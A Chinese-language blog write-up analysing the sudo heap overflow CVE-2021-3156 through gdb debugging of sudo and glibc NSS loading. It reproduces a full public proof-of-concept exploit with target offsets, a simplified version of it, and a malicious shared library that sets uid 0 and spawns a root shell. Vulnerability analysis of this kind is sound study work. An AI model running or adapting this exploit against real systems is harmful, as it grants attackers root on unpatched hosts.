> 接上一小节，主要资料：[https://forum.90sec.com/t/topic/1552](https://forum.90sec.com/t/topic/1552)
>

# POC分析
## 简化原poc
接下来看一下poc的分析，这里我参考的poc是：

> [https://github.com/blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)
>

poc代码如下：

```bash
/**
 ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
 ** ===========================================
 **
 ** Exploit for that sudo heap overflow thing everyone is talking about.
 ** This one aims for singleshot. Does not fuck with your system files.
 ** No warranties.
 **
 ** Shout outs to:
 **   Qualys      - for pumping out the awesome bugs
 **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)
 **   dsc         - for letting me rack up his electricity bill
 **   my wife     - for all the quality time we had to skip
 **
 **  Enjoy!
 **
 **   -- blasty // 20210130
 **/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <ctype.h>

// 512 environment variables should be enough for everyone
#define MAX_ENVP 512
#define SUDOEDIT_PATH "/usr/bin/sudoedit"

typedef struct {
	char *target_name;
	char *sudoedit_path;
	uint32_t smash_len_a;
	uint32_t smash_len_b;
	uint32_t null_stomp_len;
	uint32_t lc_all_len; 
} target_t;

target_t targets[] = {
    {
        // Yes, same values as 20.04.1, but also confirmed.
        .target_name    = "Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27",
        .sudoedit_path  = SUDOEDIT_PATH,
        .smash_len_a    = 56,
        .smash_len_b    = 54,
        .null_stomp_len = 63, 
        .lc_all_len     = 212
    },
    {
        .target_name    = "Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31",
        .sudoedit_path  = SUDOEDIT_PATH,
        .smash_len_a    = 56,
        .smash_len_b    = 54,
        .null_stomp_len = 63, 
        .lc_all_len     = 212
    },
    {
        .target_name    = "Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28",
        .sudoedit_path  = SUDOEDIT_PATH,
        .smash_len_a    = 64,
        .smash_len_b    = 49,
        .null_stomp_len = 60, 
        .lc_all_len     = 214
    }
};

void usage(char *prog) {
    fprintf(stdout,
        "  usage: %s <target>\n\n"
        "  available targets:\n"
        "  ------------------------------------------------------------\n",
        prog
    );
    for(int i = 0; i < sizeof(targets) / sizeof(target_t); i++) {
        printf("    %d) %s\n", i, targets[i].target_name);
    }
    fprintf(stdout,
        "  ------------------------------------------------------------\n"
        "\n"
        "  manual mode:\n"
        "    %s <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>\n"
        "\n",
        prog
    );
}

int main(int argc, char *argv[]) {
    printf("\n** CVE-2021-3156 PoC by blasty <peter@haxx.in>\n\n");

    if (argc != 2 && argc != 5) {
        usage(argv[0]);
        return -1;
    }

    target_t *target = NULL;
    if (argc == 2) {
        int target_idx = atoi(argv[1]);

        if (target_idx < 0 || target_idx >= (sizeof(targets) / sizeof(target_t))) {
            fprintf(stderr, "invalid target index\n");
            return -1;
        }

        target = &targets[ target_idx ];
    }  else {
        target = malloc(sizeof(target_t));
        target->target_name    = "Manual";
        target->sudoedit_path  = SUDOEDIT_PATH;
        target->smash_len_a    = atoi(argv[1]);
        target->smash_len_b    = atoi(argv[2]);
        target->null_stomp_len = atoi(argv[3]);
        target->lc_all_len     = atoi(argv[4]);
    }

    printf(
        "using target: %s ['%s'] (%d, %d, %d, %d)\n", 
        target->target_name,
        target->sudoedit_path,
        target->smash_len_a,
        target->smash_len_b,
        target->null_stomp_len,
        target->lc_all_len
    );

    char *smash_a = calloc(target->smash_len_a + 2, 1);
    char *smash_b = calloc(target->smash_len_b + 2, 1);

    memset(smash_a, 'A', target->smash_len_a);
    memset(smash_b, 'B', target->smash_len_b);

    smash_a[target->smash_len_a] = '\\';
    smash_b[target->smash_len_b] = '\\';

    char *s_argv[]={
        "sudoedit", "-s", smash_a, "\\", smash_b, NULL
    };

    char *s_envp[MAX_ENVP];
    int envp_pos = 0;

    for(int i = 0; i < target->null_stomp_len; i++) {
        s_envp[envp_pos++] = "\\";
    }
    s_envp[envp_pos++] = "X/P0P_SH3LLZ_";

    char *lc_all = calloc(target->lc_all_len + 16, 1);
    strcpy(lc_all, "LC_ALL=C.UTF-8@");
    memset(lc_all+15, 'C', target->lc_all_len);

    s_envp[envp_pos++] = lc_all;
    s_envp[envp_pos++] = NULL;

    printf("** pray for your rootshell.. **\n");

    execve(target->sudoedit_path, s_argv, s_envp);
    return 0;
}
```

看起来有点复杂，先根据编译后sudo-hax-me-a-sandwich的运行内存还原出最基本的execve代码：

```c
#include<stdio.h>
#include<unistd.h>
int main(){
    char *sh="/usr/bin/sudoedit";
    char* argv[]={"sudoedit","-s",
                "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\",
                "\\","BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\\",NULL};
    char* envp[]={"\\","\\","\\","\\","\\","\\","\\","\\","\\","\\",
                "\\","\\","\\","\\","\\","\\","\\","\\","\\","\\",
                "\\","\\","\\","\\","\\","\\","\\","\\","\\","\\",
                "\\","\\","\\","\\","\\","\\","\\","\\","\\","\\",
                "\\","\\","\\","\\","\\","\\","\\","\\","\\","\\",
                "\\","\\","\\","\\","\\","\\","\\","\\","\\","\\",
                "\\","\\","\\","X/P0P_SH3LLZ_", "LC_ALL=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",NULL
                };
    execve(sh,argv,envp);
    /*
	printf("[+] bl1ng bl1ng! We got it!\n");
	setuid(0); seteuid(0); setgid(0); setegid(0);
	static char *a_argv[] = { "sh", NULL };
	static char *a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
	execv("/bin/sh", a_argv);
    */
	return 0;
}
```

然后将还原好的代码使用gcc编译，并将原作者的恶意so放到同一目录下，尝试运行一下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612666053457-b11d0e26-8ded-4705-baa1-1799e49eb088.png)

可以看到提权成功，接下来分析一下poc.c和恶意so的源代码

## 分析poc.c
poc.c的代码十分简单，具体还原的步骤就不多说了（就照着原内存还原），可以参考：

> [https://www.yuque.com/cyberangel/rg9gdm/gbyagk](https://www.yuque.com/cyberangel/rg9gdm/gbyagk) #初探调用one_gadget的约束条件(execve)
>

execve函数原型如下：

```c
#include <unistd.h>
int execve (const char *filename, char *const argv [], char *const envp[]);
```

> 代码中写char *就可以了
>

简单说一下，在代码中首先定义了：char *sh、char* argv[]、char* envp[]：

+ char *sh：代表着要运行的程序，这里就是/usr/bin/目录下的sudoedit。
+ char* argv[]：sudoedit运行前向其传入的命令及参数：sudo -s .......
+ char* envp[]：代表着传入的环境变量

**<font style="color:#F5222D;">其中，argv和envp必须都是字符串并且数组以NULL结尾</font>**

这里先不用管argv和envp怎么来的，之后的动态调试会说明。

> 这里使用execve()的目的是为了便于控制执行时的env环境变量
>

## 分析恶意so源代码
lax.c代码如下：

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
static void __attribute__ ((constructor)) _init(void);
 
static void _init(void) {
	printf("[+] bl1ng bl1ng! We got it!\n");
	setuid(0); seteuid(0); setgid(0); setegid(0);
	static char *a_argv[] = { "sh", NULL };
	//static char *a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
	execv("/bin/sh", a_argv);
}
```

好家伙，上来的第6行代码就看不懂了，__attribute__ ((constructor))是什么玩意儿？

很轻松的百度可以得到结果：

> [https://www.jianshu.com/p/dd425b9dc9db](https://www.jianshu.com/p/dd425b9dc9db)
>

### __attribute__和seteuid、setegid的介绍
![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612667380141-f7b128fc-0987-4d50-be63-5ff57ef1f667.png)

其中括号中的<font style="color:#C7254E;background-color:#F2F2F2;">attribute-list</font>可以为：constructor和destructor，它们的作用如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612667512294-cd3ebfb6-e482-46e3-bbad-48e861df43f1.png)

所以可以清楚的知道：当执行恶意so时，由于有__attribute__((constructor))会先执行_init函数。

setuid(0)和setgid(0)之前都说过了，不再说，看一下seteuid(0)和setegid(0)：

> [https://blog.csdn.net/qq_41453285/article/details/103074879](https://blog.csdn.net/qq_41453285/article/details/103074879)
>

这两个函数是用来更改有效用户ID和有效组ID，函数原型如下：

```c
#include <unistd.h>
int seteuid(uid_t uid);
int setegid(gid_ gid);
 
//返回值：若成功返回0；失败返回-1
```

+ POSIX.1包含了这两个函数，它们类似于setuid和setgid，但是这两个函数**<font style="color:#3399EA;">只更改有效用户ID/有效组ID</font>**
+ 一个非特权用户可将其有效用户ID设置为其实际用户ID或其保存的设置用户ID，对于一个特权用户则可将有效用户ID设置为uid

### ![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612668640964-78d9b4fc-5cf4-469f-a0c5-0788e0fa7a71.png)


### exec()函数族
接下来就到了execv函数，来看一下：

> [https://blog.csdn.net/yangbodong22011/article/details/50197785](https://blog.csdn.net/yangbodong22011/article/details/50197785)
>

exec是一个函数族，包括`execle`,`execlp`,`execvp`,`execv`,`execl,`但是本质上都是调用execve()。它们的区别就在于对路径名，参数以及环境变量的指定上。分别从这三个方面来区分这几个函数：

+ 路径名：带`p`的表示可以通过环境变量PATH去查找，所以我们可以不用绝对路径，比如execlp和execvp就可以直接用filename。
+ 参数：带`l`的execle()和execlp()以及execl()要求在调用中以字符串形式指定参数。首个参数相当于新程序main中的argv[0],因而通常与filename中的basename相同(就是绝对路径的最后一个)。
+ 环境变量：以`e`结尾的允许我们通过envp为新程序显式的指定环境变量，其中envp必须以`NULL`结尾。

exec()函数族之间的差异如下面表格所示：

| 函数 | 执行程序文件 | 参数 | 环境变量 |
| :---: | :---: | :---: | :---: |
| execve() | 路径名 | 数组 | envp参数 |
| execle() | 路径名 | 列表 | envp数组 |
| execlp() | 文件名 | 列表 | 调用者environ |
| execvp() | 文件名 | 数组 | 调用者environ |
| execv() | 路径名 | 数组 | 调用者environ |
| execl() | 路径名 | 列表 | 调用者environ |


# 一些疑问
<font style="background-color:#FEFEFE;">有三个问题值得我们去讨论：</font>

1. poc文件是如何加载恶意so的？
2. 为什么恶意so的文件夹命名一定要为libnss_X？
3. 为什么poc.c中要出现X/P0P_SH3LLZ_和LC_ALL=C.UTF-8这两个看不懂的字样？

## NSS和locale
### NSS
<font style="background-color:#FEFEFE;">从twitter上可以获取一些信息来帮助我们走出困境：</font>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612670514963-54732536-04c9-4e23-9353-ae0d5d2d26d6.png)

> <font style="background-color:#FEFEFE;">@Awarau：最简单的方式就是堆溢出覆盖到service user struct，这个结构体是nss_load_library创建使用的，通过这种方式你能加载你自己的so动态连接库来提权。</font>
>

首先要弄清楚nss_load_library和service user struct到底是什么。问度娘什么都没有，只能问“谷哥”了，

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612671256202-04600ffa-b6a5-4b76-8c25-70eee4d22774.png)

nss_load_library是glibc中nss的一个函数，而NSS（Name Service Switch）相关配置文件存储在/etc/nsswitch.conf，这个文件是用来解析用户ID登录名称、IP地址转换为主机名等，详情如下；

```bash
-------------------------------------------------------------------------------
下面的列表描述了nsswitch.conf文件控制搜索的大多数信息(Info项)的类型。
automount：		自动挂载（/etc/auto.master和/etc/auto.misc）
bootparams：		无盘引导选项和其他引导选项（参见bootparam的手册页）
ethers：				MAC地址
group：				用户所在组（/etc/group),getgrent()函数使用该文件
hosts：				主机名和主机号（/etc/hosts)，gethostbyname()以及类似的函数使用该文件
networks：			网络名及网络号（/etc/networks)，getnetent()函数使用该文件
passwd：				用户口令（/etc/passwd)，getpwent()函数使用该文件
protocols：		网络协议（/etc/protocols），getprotoent()函数使用该文件
publickey：		NIS+及NFS所使用的secure_rpc的公开密钥
rpc：					远程过程调用名及调用号（/etc/rpc），getrpcbyname()及类似函数使用该文件
services：			网络服务（/etc/services），getservent()函数使用该文件
shadow：				映射口令信息（/etc/shadow），getspnam()函数使用该文件
aiases：				邮件别名，sendmail()函数使用该文件
-------------------------------------------------------------------------------
nsswich.conf文件控制搜索信息类型的方法，对于每一种信息类型，都可以指定下面的一种或多种方法：
files：		搜索本地文件，如/etc/passwd和/etc/hosts
nis：			搜索NIS数据库，nis还有一个别名，即yp
dns：			查询DNS（只查询主机）
compat：		passwd、group和shadow文件中的±语法
-------------------------------------------------------------------------------
compat方法：passwd、group和shadow文件中的"±"
    可以在/etc/passwd、/etc/group和/etc/shadow文件中放入一些特殊的代码，
    （如果在nsswitch.conf文件中指定compat方法的话）
    让系统将本地文件和NIS映射表中的项进行合并和修改。
    在这些文件中，如果在行首出现加号'＋'，就表示添加NIS信息；如果出现减号'－'，
    就表示删除信息。举例来说，要想使用passwd文件中的这些代码，
    可以在nsswitch.conf文件中指定passwd: compat。
    然后系统就会按照顺序搜寻passwd文件，当它遇到以+或者 开头的行时，
    就会添加或者删除适当的NIS项。
    虽然可以在passwd文件的末尾放置加号，在nsswitch.conf文件中指定passwd: compat，
    以搜索本地的passwd文件，然后再搜寻NIS映射表，
    但是更高效的一种方法是在nsswitch.conf文件中添加passwd: file nis而不修改passwd文件。
```

回头看那个配置文件，我们对其注释一下：

```shell
cyberangel@ubuntu:~/Desktop/My_CVE$ cat /etc/nsswitch.conf
# /etc/nsswitch.conf
#
# Example configuration of GNU Name Service Switch functionality.
# If you have the `glibc-doc-reference' and `info' packages installed, try:
# `info libc "Name Service Switch"' for information about this file.

#搜索项          #搜索方式 					路径名   					搜索项存放的内容
passwd:         compat systemd #在/etc/passwd中搜索 		用户口令
group:          compat systemd #在/etc/group中搜索			用户所在组
shadow:         compat         #在/etc/shadow中搜索			映射口令信息
gshadow:        files					 #在/etc/gshadow中搜索		组用户的密码信息
##（systemd：自启动服务）
hosts:          files mdns4_minimal [NOTFOUND=return] dns myhostname
															 #在/etc/hosts中搜索			主机名和主机号
networks:       files					 #在/etc/networks中搜索   网络名及网络号

protocols:      db files			 #在/etc/protocols中搜索  网络协议
services:       db files			 #在/etc/services中搜索   网络服务
ethers:         db files			 #文件数目不确定，略   		 MAC地址   
rpc:            db files			 #在/etc/rpc中搜索	      远程过程调用名及调用号			

netgroup:       nis		      	 #在/etc/netgroup中搜索		定义网络范围组
																											（用于在执行远程安装，远程登录和远程Shell时检查权限）
cyberangel@ubuntu:~/Desktop/My_CVE$ 
```

> **<font style="color:#F5222D;">针对每种数据（都定义了查找方法的服务规范</font>****<font style="color:#F5222D;">配置文件的第二列）</font>****<font style="color:#F5222D;">，在GNU C Library里, 每个可用的服务规范（SERVICE，也可以说是查找方式）都必须有文件 </font>**`**<font style="color:#F5222D;">/lib/libnss_SERVICE.so.1</font>**`**<font style="color:#F5222D;"> 与之对应，例如：group数据库定义了服务规范compat systemd ，在调用</font>**`**<font style="color:#F5222D;">getgroup()</font>**`**<font style="color:#F5222D;">函数时就会调用</font>**`**<font style="color:#F5222D;">/lib/libnss_files.so.1</font>**`**<font style="color:#F5222D;">的</font>**`**<font style="color:#F5222D;">nss_lookup_function</font>**`**<font style="color:#F5222D;">进行查找。</font>**
>

联想到poc中的代码，程序在加载时可能会调用nss_load_library函数解析passwd、group、shadow这三个文件，一个gdb自动补全足以说明：

```c
cyberangel@ubuntu:~/Desktop/My_CVE$ cat hello.c
#include<stdio.h>
int main(){
	printf("Hello");
	return 0;
}
cyberangel@ubuntu:~/Desktop/My_CVE$ gdb hello 
pwndbg> b printf
Breakpoint 1 at 0x520
pwndbg> r
Starting program: /home/cyberangel/Desktop/My_CVE/hello 
pwndbg> b nss_load_library 
#输入nss_load_后按下tab会自动补全，说明程序已经调用过这个函数
#也就是说每个程序加载时都会解析nsswitch.conf文件。
```

### locale
<font style="background-color:#FEFEFE;">因为</font><font style="background-color:#FEFEFE;">LC_ALL=C.UTF-8出现在execve的</font><font style="background-color:#FEFEFE;">envp参数中，可以猜测这和环境变量有关，get root shell之后可以证明这一点：</font>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612669863143-82674a18-d74d-4ff4-9776-3d01b2514426.png)

在Linux中通过locale（区域设置）来设置程序运行的不同语言环境，locale由ANSI C提供支持。同时，在locale环境中，通过一组变量来代表国际化环境中的不同设置：

```shell
LC_COLLATE		定义该环境的排序和比较规则
LC_CTYPE			用于字符分类和字符串处理，控制所有字符的处理方式，包括字符编码，
							字符是单字节还是多字节，如何打印等。是最重要的一个环境变量。
LC_MONETARY		货币格式
LC_NUMERIC		非货币的数字显示格式
LC_TIME				时间和日期格式
LC_MESSAGES		提示信息的语言。另外还有一个LANGUAGE参数，它与LC_MESSAGES相似，
							但如果该参数一旦设置，则LC_MESSAGES参数就会失效。
              LANGUAGE参数可同时设置多种语言信息，
              如LANGUANE=“zh_CN.GB18030:zh_CN.GB2312:zh_CN”。
LANG					LC_*的默认值，是最低级别的设置，如果LC_*没有设置，则使用该值。类似于 LC_ALL。
LC_ALL				它是一个宏，如果该值设置了，则该值会覆盖所有LC_*的设置值。注意，LANG的值不受该宏影响。

"C"是系统默认的locale，"POSIX"是"C"的别名。所以当我们新安装完一个系统时，
默认的locale就是C或POSIX。“POSIX”:指定的最小环境c语言翻译称为POSIX locale。
如果不调用setlocale (), POSIX locale是默认的“C”相当于“POSIX”。
```

另外，locale（区域设置）的命名规则如下：

```shell
language[_territory[.codeset]][@modifier]
```

其中language是ISO 639-1标准中定义的双字母的语言代码，territory是ISO 3166-1标准中定义的双字母的国家和地区代码，codeset是字符集的名称 (如 UTF-8等)，而 modifier 则是某些 locale 变体的修正符。通常使用setlocale()函数对程序进行地域设置。

可以查看本地所定义的locale，如下图所示：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612689719716-52835b7d-52dd-40f7-bdf9-65ab3077a9ba.png)

> 如zh_CN.UTF-8，zh代表中文，CN代表大陆地区，UTF-8表示字符集。
>

为了印证上面所说的内容，接下来我们对poc程序进行动态调试

## poc动态调试
### 断点引入
动态调试牵扯到glibc，因此先下载glibc源码：

> 记着打开虚拟机网络，用完之后再关上
>

```shell
sudo apt-get install glibc-source
cyberangel@ubuntu:/usr/src/glibc$ ls
debian  glibc-2.27.tar.xz
```

将tar.xz文件复制到桌面上，然后解压缩：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612691046942-db61cd65-ca3e-4b35-91f4-b701a27cee8a.png)

之前已经知道poc牵扯到nss_load_library，因此对其下断点，下断点方式如下：

和之前的调试不太相同，这里要安装sudo的符号表文件，这样在未执行到sudo之前即可对其下断点，大大方便了我们的调试工作，

> 下载地址：
>
> [https://launchpad.net/~ubuntu-security-proposed/+archive/ubuntu/ppa/+build/18637849/+files/sudo-dbgsym_1.8.21p2-3ubuntu1.2_amd64.ddeb](https://launchpad.net/~ubuntu-security-proposed/+archive/ubuntu/ppa/+build/18637849/+files/sudo-dbgsym_1.8.21p2-3ubuntu1.2_amd64.ddeb)
>

下载完成之后放入到虚拟机中，打开终端进行安装：

```bash
cyberangel@ubuntu:~/Desktop$ sudo dpkg -i sudo-dbgsym_1.8.21p2-3ubuntu1.2_amd64.ddeb 
Password: 
dpkg: warning: downgrading sudo-dbgsym from 1.8.21p2-3ubuntu1.4 to 1.8.21p2-3ubuntu1.2
(Reading database ... 137298 files and directories currently installed.)
Preparing to unpack sudo-dbgsym_1.8.21p2-3ubuntu1.2_amd64.ddeb ...
Unpacking sudo-dbgsym (1.8.21p2-3ubuntu1.2) over (1.8.21p2-3ubuntu1.4) ...
Setting up sudo-dbgsym (1.8.21p2-3ubuntu1.2) ...
cyberangel@ubuntu:~/Desktop$ 
```

> 这里注意符号表只能手动安装，若使用apt安装会自动更新sudo无法继续调试漏洞。
>

安装完成之后，引入源码后即可对sudo进行调试，具体方式如下：

```c
cyberangel@ubuntu:~/Desktop/My_CVE$ sudo su
Password: 
root@ubuntu:/home/cyberangel/Desktop/My_CVE# gdb poc
......(内容略)
pwndbg> catch exec
Catchpoint 1 (exec)
pwndbg> r
Starting program: /home/cyberangel/Desktop/My_CVE/poc 
process 24199 is executing new program: /usr/bin/sudo

Catchpoint 1 (exec'd /usr/bin/sudo), 0x00007ffff7dd4090 in _start () from /lib64/ld-linux-x86-64.so.2
......(内容略)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> b sudo.c:1
Breakpoint 2 at 0x5555555591d0: file ../../src/sudo.c, line 1.
pwndbg> c
Continuing.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 2, main (argc=argc@entry=5, argv=argv@entry=0x7fffffffea58, envp=0x7fffffffea88) at ../../src/sudo.c:135
135	../../src/sudo.c: No such file or directory.
......(内容略)
pwndbg> dir /home/cyberangel/Desktop/sudo-1.8.21p2/src/
Source directories searched: /home/cyberangel/Desktop/sudo-1.8.21p2/src:$cdir:$cwd
pwndbg> ni
......(内容略)
──────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────
In file: /home/cyberangel/Desktop/sudo-1.8.21p2/src/sudo.c
   130 
   131 __dso_public int main(int argc, char *argv[], char *envp[]);
   132 
   133 int
   134 main(int argc, char *argv[], char *envp[])
 ► 135 {
   136     int nargc, ok, status = 0;
   137     char **nargv, **env_add;
   138     char **user_info, **command_info, **argv_out, **user_env_out;
   139     struct sudo_settings *settings;
   140     struct plugin_container *plugin, *next;
......(内容略)
pwndbg> 
```

> **<font style="color:#F5222D;">catch exec的作用是当程序进入新进程后立刻断下。</font>**
>

## 开始调试
### 1、预处理sudo环境变量
在执行poc最后一行的execve后程序会加载sudo，首先要加载的是sudo的环境变量，这个过程在sudo.c的main函数第148处的setlocale函数进行预处理：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612755600791-b302ab86-58c6-48df-a82c-cc7e3a9f768b.png)

在gdb中单步进入后引入glibc的源码：

> dir /home/cyberangel/Desktop/glibc-2.27/locale
>

当然，从这个函数的名字就可以看出它是用来设置环境变量的：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612756162333-e878cf7d-9b33-45a9-9608-3475c6e2999b.png)

具体是怎么设置环境变量的不用仔细研究，输入finish以步出这个函数：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612756351520-82caed0a-79bf-432f-bd81-25677687548c.png)

从下面这张图中可以知道我们知道poc环境变量已经被传入：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612756554407-bb20ee56-0f03-4f6e-99bc-fdec06ef9aa4.png)

### 2、为环境变量申请空间
在sudo.c: 163的sudo_conf_read函数内的setlocale为LC_ALL申请内存空间，gdb步入：

> dir /home/cyberangel/Desktop/sudo-1.8.21p2/lib/util
>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612757136663-3ab871c2-fe07-4628-8933-4bdaa8899772.png)![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612758126263-585d51e4-af39-4c02-be52-f38b886671e4.png)

调用栈如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612758162662-e49d4f9b-c457-4819-9550-812cb18ba005.png)

> 设置环境变量LC_ALL的目的是为了影响chunk的分配。
>

### 3、获取用户信息
#### #整体把控
回到sudo.c中， 在代码第185行的get_user_info函数用于获取用户信息：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612760641624-27a1ad0c-e890-410b-bb5d-08169ad79e00.png)

输入b sudo.c:185，然后在gdb中单步步入：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612760884400-d5f3f66f-934f-4223-a451-dd34f283521c.png)

这个函数定义在sudo.c:489行，大致看了一下源码，的确是获取用户信息的，对609行下断点直接看一下结果：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612761365007-729624aa-993a-447c-8853-2924b3aa43ed.png)

结合之前的NSS可以断定这个函数搜索解析了/etc/nsswitch.conf文件，印证结果如下

> delete #删除所有断点 
>
> b b __memmove_avx_unaligned_erms
>
> r 
>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612761663781-c5c64027-232e-4a8c-ac1b-83c36b2eb4a2.png)

也就是说这个函数用来解析nsswitch.conf文件，初始化systemd服务规范的service_user结构体空间。

#### #深入细节
service_user结构体定义在文件“nsswitch.h”中：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612763299723-02442f66-c70f-4ab4-826d-dd80b8e0963e.png)

根据调用栈的提示：“__GI___nss_database_lookup”，重新下断点调试到nsswitch.c处并引入源码：

> dir /home/cyberangel/Desktop/glibc-2.27/nss
>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612763431848-4156a7f0-99fd-4aca-8821-fa176683cfec.png)

现在的结构体还没有初始化：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612763807986-4594369e-0b81-47f5-bde4-a1bcc2ea0e23.png)

查看函数执行完毕的结果：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612764018639-5e395f62-ef16-437d-a340-ba02e6f89369.png)

在调用函数__GI___nss_database_lookup之后，会调用nss_load_library函数对所需的so文件进行加载：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612764999948-5a4e6636-9496-45da-877b-eb76d8016550.png)

**<font style="color:#F5222D;">通过阅读nss_load_library函数实现可知：当 ni->library->lib_handle == NULL时，会通过__libc_dlopen调用 "libnss_"+ni->name+".so";因此我们要通过溢出覆写service_user->name，使得程序加载攻击者预先设置的恶意libc从而提权:</font>**

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612765264247-04e3efc6-df25-4122-9e39-5b2b3f86c656.png)

> 注：现在恶意so还未加载。 
>

### 4、设置调用parse_args设置sudo_mode![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612768697499-10787cc3-8a7c-4051-a593-e9bab1345fa7.png)
之前没有总结parse_args函数的作用，这里总结一下：

+ 根据用户执行命令及相关参数对mode及flags标志位进行赋值。
+ 根据mode及flags标志位的值，判断是否需要对'\'等特殊字符进行转义。

>  parse_args()会对启用了 -s或 -i的 MODE_SHELL和 MODE_RUN 的 sudo的参数加上 反斜杠 转义
>

+ 对参数数量变量int nargc以及参数指针变量char **nargv进行赋值。
+ 将mode|flags的计算结果作为返回值赋给主函数的sudo_mode变量。

之前说的不详细，这里再补充一点内容：

> [https://www.freebuf.com/vuls/263062.html](https://www.freebuf.com/vuls/263062.html)
>

攻击者执行sudoedit [-s shell] file命令时，parse_args()函数会判断用户命令行输入的执行文件名char *progname是否为**"sudoedit"字符串，如果是则将int mode变量置为MODE_EDIT**（该宏为0x02）。然后使用switch()语句判断参数是否包含**'-s'，如果是则将int flags变量置为MODE_SHELL**（该宏为0x20000）。

```c
#define DEFAULT_VALID_FLAGS	(MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)

int
parse_args(int argc, char **argv, int *nargc, char ***nargv,
    struct sudo_settings **settingsp, char ***env_addp)
{
    struct environment extra_env;
    int mode = 0;
    int flags = 0;
    int valid_flags = DEFAULT_VALID_FLAGS;
...
    if (proglen > 4 && strcmp(progname + proglen - 4, "edit") == 0) {
	progname = "sudoedit";
	mode = MODE_EDIT;
	sudo_settings[ARG_SUDOEDIT].value = "true";
    }
...
    if ((ch = getopt_long(argc, argv, short_opts, long_opts, NULL)) != -1) {
	    switch (ch) {
    		case 's':
		    sudo_settings[ARG_USER_SHELL].value = "true";
		    SET(flags, MODE_SHELL);
		    break;
    }
...
}
```

当mode值为MODE_EDIT（该宏为0x02），且flags为MODE_SHELL（该宏为0x20000）时，语句

```c
//parse_args.c parse_args()
    if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {
    	...
```

执行结果为false，可绕过判断。否则代码在包含'\'在内的特殊字符前添加'\\'进行转义，会导致攻击失效。

最终将*nargc赋值为argc，将*nargv 赋值为argv。并mode | flags的计算结果返回给主函数的sudo_mode变量。

```c
#define DEFAULT_VALID_FLAGS	(MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)

int
parse_args(int argc, char **argv, int *nargc, char ***nargv,
    struct sudo_settings **settingsp, char ***env_addp)
{
    struct environment extra_env;
    int mode = 0;
    int flags = 0;
    int valid_flags = DEFAULT_VALID_FLAGS;
...
    if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {
	char **av, *cmnd = NULL;
	int ac = 1;
	if (argc != 0) {
	    char *src, *dst;
	    size_t cmnd_size = (size_t) (argv[argc - 1] - argv[0]) +
		strlen(argv[argc - 1]) + 1;
	    for (av = argv; *av != NULL; av++) {
		for (src = *av; *src != '\0'; src++) {
		    if (!isalnum((unsigned char)*src) && *src != '_' && *src != '-' && *src != '$')
			*dst++ = '\\';
		    *dst++ = *src;
		}
...
*nargc = argc;
*nargv = argv;
}
```

继续调试，但是发现最终sudo结束在：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612769056986-4fcdec64-89d8-4b03-b140-df85c029bbd0.png)

我们单步步入call usage(1)：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1612769173302-59185a5a-e5c9-4cad-af7b-b1a62ca14c67.png)

此时就可以对sudoers.c下断点，但是下断点运行之后无法运行到溢出点（不知道什么情况，如下图所示），我们得换个思路。

